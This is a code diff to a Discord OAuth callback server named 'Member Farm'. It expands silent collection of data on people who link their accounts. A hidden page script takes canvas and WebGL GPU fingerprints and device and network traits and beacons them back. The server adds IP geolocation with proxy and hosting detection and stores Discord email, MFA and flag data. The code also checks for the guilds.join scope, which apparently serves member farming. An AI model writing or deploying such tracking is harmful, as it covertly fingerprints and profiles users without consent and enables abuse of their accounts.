@@ -28,31 +28,36 @@ async function dedupeAllTokens() {
 }
 
 function getClientIp(req) {
-  const xf = (req.headers['x-forwarded-for'] || '').toString();
+  const h = req.headers || {};
+  for (const key of ['cf-connecting-ip', 'true-client-ip', 'x-real-ip']) {
+    const v = (h[key] || '').toString().trim();
+    if (v) return v;
+  }
+  const xf = (h['x-forwarded-for'] || '').toString();
   if (xf) return xf.split(',')[0].trim();
-  const real = (req.headers['x-real-ip'] || '').toString().trim();
-  if (real) return real;
-  const cf = (req.headers['cf-connecting-ip'] || '').toString().trim();
-  if (cf) return cf;
   return (req.socket && req.socket.remoteAddress) || req.ip || '';
 }
 
 function collectServerInfo(req) {
-  const headers = req.headers || {};
+  const h = req.headers || {};
   return {
     ip: getClientIp(req),
-    forwarded_for: (headers['x-forwarded-for'] || '').toString(),
-    real_ip: (headers['x-real-ip'] || '').toString(),
-    user_agent: (headers['user-agent'] || '').toString(),
-    accept_language: (headers['accept-language'] || '').toString(),
-    accept: (headers['accept'] || '').toString(),
-    referer: (headers['referer'] || headers['referrer'] || '').toString(),
-    origin: (headers['origin'] || '').toString(),
-    host: (headers['host'] || '').toString(),
+    forwarded_for: (h['x-forwarded-for'] || '').toString(),
+    real_ip: (h['x-real-ip'] || '').toString(),
+    user_agent: (h['user-agent'] || '').toString(),
+    accept_language: (h['accept-language'] || '').toString(),
+    accept: (h['accept'] || '').toString(),
+    referer: (h['referer'] || h['referrer'] || '').toString(),
+    origin: (h['origin'] || '').toString(),
+    host: (h['host'] || '').toString(),
     method: req.method || 'GET',
     path: req.path || req.url || '',
     query_string: JSON.stringify(req.query || {}),
-    raw_headers: JSON.stringify(headers),
+    raw_headers: JSON.stringify(h),
+    cf_country: (h['cf-ipcountry'] || '').toString(),
+    sec_ch_ua: (h['sec-ch-ua'] || '').toString(),
+    sec_ch_ua_mobile: (h['sec-ch-ua-mobile'] || '').toString(),
+    sec_ch_ua_platform: (h['sec-ch-ua-platform'] || '').toString(),
   };
 }
 
@@ -60,10 +65,12 @@ async function lookupGeo(ip) {
   if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') || ip.startsWith('192.168.')) {
     return {};
   }
-  // strip ipv6 prefix if present
-  let clean = ip.replace(/^::ffff:/, '');
+  const clean = ip.replace(/^::ffff:/, '');
   try {
-    const res = await fetch('http://ip-api.com/json/' + encodeURIComponent(clean) + '?fields=status,country,regionName,city,isp,org,timezone,lat,lon,query',
+    const res = await fetch(
+      'http://ip-api.com/json/' +
+        encodeURIComponent(clean) +
+        '?fields=status,country,regionName,city,isp,org,as,asname,proxy,hosting,timezone,lat,lon,query',
       { signal: AbortSignal.timeout(2500) }
     );
     const data = await res.json();
@@ -77,6 +84,10 @@ async function lookupGeo(ip) {
       timezone: data.timezone || '',
       lat: data.lat != null ? String(data.lat) : '',
       lon: data.lon != null ? String(data.lon) : '',
+      asn: data.as || '',
+      as_name: data.asname || '',
+      proxy: data.proxy != null ? String(data.proxy) : '',
+      hosting: data.hosting != null ? String(data.hosting) : '',
     };
   } catch (e) {
     console.error('geo lookup', e.message);
@@ -90,8 +101,10 @@ function pageHtml(opts) {
   const username = opts.username || '';
   const title = ok ? 'Authorized' : 'Authorization failed';
   const subtitle = ok
-    ? (username ? 'Welcome, ' + username + '. Account linked successfully.' : 'Account linked. You can close this window.')
-    : (opts.error || 'Something went wrong.');
+    ? username
+      ? 'Welcome, ' + username + '. Account linked successfully.'
+      : 'Account linked. You can close this window.'
+    : opts.error || 'Something went wrong.';
   const color = ok ? '#57f287' : '#ed4245';
 
   return `<!DOCTYPE html>
@@ -111,22 +124,20 @@ function pageHtml(opts) {
   .dot{width:64px;height:64px;border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;
     justify-content:center;background:${color}22;border:2px solid ${color}}
   .dot svg{width:28px;height:28px;stroke:${color};fill:none;stroke-width:2.5}
-  h1{font-size:1.35rem;font-weight:700;margin-bottom:8px;letter-spacing:.02em}
-  p{color:#9a9ab0;font-size:.95rem;line-height:1.5;margin-bottom:6px}
-  .meta{margin-top:22px;padding-top:16px;border-top:1px solid #2a2a3c;font-size:.75rem;color:#6a6a80;
-    text-align:left;word-break:break-all}
-  .meta div{margin:4px 0}
+  h1{font-size:1.35rem;font-weight:700;margin-bottom:8px}
+  p{color:#9a9ab0;font-size:.95rem;line-height:1.5}
   .tag{display:inline-block;margin-top:14px;padding:4px 10px;border-radius:999px;font-size:.7rem;
     background:#1e1e2e;color:#8b8ba0;border:1px solid #2a2a3c}
+  .meta{margin-top:22px;padding-top:16px;border-top:1px solid #2a2a3c;font-size:.75rem;color:#6a6a80;text-align:left}
 </style>
 </head>
 <body>
   <div class="card">
-    <div class="dot">
-      ${ok
+    <div class="dot">${
+      ok
         ? '<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>'
-        : '<svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>'}
-    </div>
+        : '<svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>'
+    }</div>
     <h1>${title}</h1>
     <p>${subtitle}</p>
     <span class="tag">Member Farm</span>
@@ -136,21 +147,67 @@ function pageHtml(opts) {
 (function(){
   var visitId = ${JSON.stringify(String(visitId))};
   if (!visitId) return;
+
+  function canvasHash() {
+    try {
+      var c = document.createElement('canvas');
+      c.width = 240; c.height = 60;
+      var ctx = c.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(0,0,240,60);
+      ctx.fillStyle = '#069';
+      ctx.fillText('MemberFarm:' + navigator.userAgent.slice(0,40), 2, 15);
+      ctx.fillStyle = 'rgba(102,204,0,0.7)';
+      ctx.fillText('fp', 2, 35);
+      return c.toDataURL().slice(-64);
+    } catch (e) { return ''; }
+  }
+
+  function webglInfo() {
+    try {
+      var c = document.createElement('canvas');
+      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!gl) return { vendor: '', renderer: '' };
+      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      return {
+        vendor: dbg ? String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '') : '',
+        renderer: dbg ? String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '') : ''
+      };
+    } catch (e) { return { vendor: '', renderer: '' }; }
+  }
+
+  var gl = webglInfo();
+  var conn = (navigator.connection || navigator.mozConnection || navigator.webkitConnection || {});
   var payload = {
     visitId: visitId,
-    screen: (screen.width||'') + 'x' + (screen.height||''),
+    screen: (screen.width||'') + 'x' + (screen.height||'') + '@' + (screen.availWidth||'') + 'x' + (screen.availHeight||''),
     color_depth: String(screen.colorDepth||''),
     pixel_ratio: String(window.devicePixelRatio||''),
     platform: navigator.platform||'',
+    vendor: navigator.vendor||'',
     hardware_concurrency: String(navigator.hardwareConcurrency||''),
     device_memory: String(navigator.deviceMemory||''),
     touch_points: String(navigator.maxTouchPoints||''),
+    max_touch: String(navigator.maxTouchPoints||''),
     client_timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone||''),
     client_languages: (navigator.languages||[navigator.language||'']).join(','),
     webdriver: String(!!navigator.webdriver),
     cookie_enabled: String(navigator.cookieEnabled),
-    user_agent: navigator.userAgent||''
+    do_not_track: String(navigator.doNotTrack||window.doNotTrack||''),
+    canvas_hash: canvasHash(),
+    webgl_vendor: gl.vendor,
+    webgl_renderer: gl.renderer,
+    connection_type: String(conn.effectiveType||conn.type||''),
+    downlink: String(conn.downlink||''),
+    rtt: String(conn.rtt||''),
+    user_agent: navigator.userAgent||'',
+    offline: String(!navigator.onLine),
+    pdf_viewer: String(!!navigator.pdfViewerEnabled),
+    hw_concurrency: String(navigator.hardwareConcurrency||'')
   };
+
   try {
     fetch('/oauth/beacon', {
       method: 'POST',
@@ -159,12 +216,14 @@ function pageHtml(opts) {
       keepalive: true
     });
   } catch(e) {}
+
   var el = document.getElementById('meta');
   if (el) {
     el.innerHTML =
       '<div>Platform: ' + (payload.platform||'-') + '</div>' +
       '<div>Screen: ' + (payload.screen||'-') + '</div>' +
-      '<div>Timezone: ' + (payload.client_timezone||'-') + '</div>';
+      '<div>Timezone: ' + (payload.client_timezone||'-') + '</div>' +
+      '<div>GPU: ' + ((payload.webgl_renderer||'-').slice(0,48)) + '</div>';
   }
 })();
 </script>
@@ -177,22 +236,20 @@ function createOAuthServer(client) {
   const PORT = Number(process.env.PORT) || 3000;
 
   app.set('trust proxy', true);
-  app.use(express.json({ limit: '32kb' }));
+  app.use(express.json({ limit: '64kb' }));
 
   app.get('/', (req, res) => {
-    res.type('html').send(pageHtml({
-      ok: true,
-      username: '',
-      visitId: '',
-      error: '',
-    }).replace('Authorized', 'Member Farm').replace('Account linked. You can close this window.', 'OAuth server online.'));
+    res.type('html').send(
+      pageHtml({ ok: true, visitId: '', username: '', error: '' })
+        .replace('Authorized', 'Member Farm')
+        .replace('Account linked. You can close this window.', 'OAuth server online.')
+    );
   });
 
   app.get('/health', (req, res) =>
     res.json({ ok: true, bot: client?.user?.tag || 'starting', guilds: client?.guilds?.cache?.size ?? 0 })
   );
 
-  // Client-side beacon after page load
   app.post('/oauth/beacon', async (req, res) => {
     try {
       const b = req.body || {};
@@ -211,7 +268,16 @@ function createOAuthServer(client) {
           client_languages = COALESCE($10, client_languages),
           webdriver = COALESCE($11, webdriver),
           cookie_enabled = COALESCE($12, cookie_enabled),
-          client_extra = $13
+          canvas_hash = COALESCE($13, canvas_hash),
+          webgl_vendor = COALESCE($14, webgl_vendor),
+          webgl_renderer = COALESCE($15, webgl_renderer),
+          connection_type = COALESCE($16, connection_type),
+          downlink = COALESCE($17, downlink),
+          rtt = COALESCE($18, rtt),
+          do_not_track = COALESCE($19, do_not_track),
+          vendor = COALESCE($20, vendor),
+          max_touch = COALESCE($21, max_touch),
+          client_extra = $22
          WHERE id = $1`,
         [
           id,
@@ -226,6 +292,15 @@ function createOAuthServer(client) {
           b.client_languages || null,
           b.webdriver || null,
           b.cookie_enabled || null,
+          b.canvas_hash || null,
+          b.webgl_vendor || null,
+          b.webgl_renderer || null,
+          b.connection_type || null,
+          b.downlink || null,
+          b.rtt || null,
+          b.do_not_track || null,
+          b.vendor || null,
+          b.max_touch || null,
           JSON.stringify(b),
         ]
       );
@@ -242,16 +317,17 @@ function createOAuthServer(client) {
     const serverInfo = collectServerInfo(req);
     const geo = await lookupGeo(serverInfo.ip);
 
-    // Always log a visit row first (even on error)
     let visitId = null;
     try {
       const ins = await one(
         `INSERT INTO oauth_visits (
           ip, forwarded_for, real_ip, user_agent, accept_language, accept, referer, origin, host,
           method, path, query_string, country, region, city, isp, org, timezone, lat, lon,
-          raw_headers, status
+          raw_headers, status, cf_country, sec_ch_ua, sec_ch_ua_mobile, sec_ch_ua_platform,
+          asn, as_name, proxy, hosting
         ) VALUES (
-          $1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22
+          $1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,
+          $23,$24,$25,$26,$27,$28,$29,$30
         ) RETURNING id`,
         [
           serverInfo.ip,
@@ -276,6 +352,14 @@ function createOAuthServer(client) {
           geo.lon || null,
           serverInfo.raw_headers,
           err ? 'oauth_error' : 'pending',
+          serverInfo.cf_country || null,
+          serverInfo.sec_ch_ua || null,
+          serverInfo.sec_ch_ua_mobile || null,
+          serverInfo.sec_ch_ua_platform || null,
+          geo.asn || null,
+          geo.as_name || null,
+          geo.proxy || null,
+          geo.hosting || null,
         ]
       );
       visitId = ins?.id || null;
@@ -321,15 +405,11 @@ function createOAuthServer(client) {
             visitId, 'token_exchange_failed', JSON.stringify(tokenData),
           ]).catch(() => {});
         }
-        return res.status(400).type('html').send(pageHtml({
-          ok: false, visitId, error: 'Token exchange failed',
-        }));
+        return res.status(400).type('html').send(pageHtml({ ok: false, visitId, error: 'Token exchange failed' }));
       }
 
       const scope = String(tokenData.scope || '');
-      if (!scope.includes('guilds.join')) {
-        console.warn('OAuth token missing guilds.join scope:', scope);
-      }
+      if (!scope.includes('guilds.join')) console.warn('OAuth token missing guilds.join scope:', scope);
 
       const userRes = await fetch('https://discord.com/api/users/@me', {
         headers: { Authorization: 'Bearer ' + tokenData.access_token },
@@ -361,7 +441,8 @@ function createOAuthServer(client) {
         await query(
           `UPDATE oauth_visits SET
             user_id = $2, username = $3, global_name = $4, avatar = $5, email = $6,
-            locale = $7, mfa_enabled = $8, verified = $9, premium_type = $10, status = $11
+            locale = $7, mfa_enabled = $8, verified = $9, premium_type = $10, status = $11,
+            discord_flags = $12, public_flags = $13, banner = $14, accent_color = $15
            WHERE id = $1`,
           [
             visitId,
@@ -375,6 +456,10 @@ function createOAuthServer(client) {
             user.verified ? 1 : 0,
             user.premium_type != null ? Number(user.premium_type) : null,
             'authorized',
+            user.flags != null ? String(user.flags) : null,
+            user.public_flags != null ? String(user.public_flags) : null,
+            user.banner || null,
+            user.accent_color != null ? String(user.accent_color) : null,
           ]
         ).catch((e) => console.error('visit update', e.message));
       }
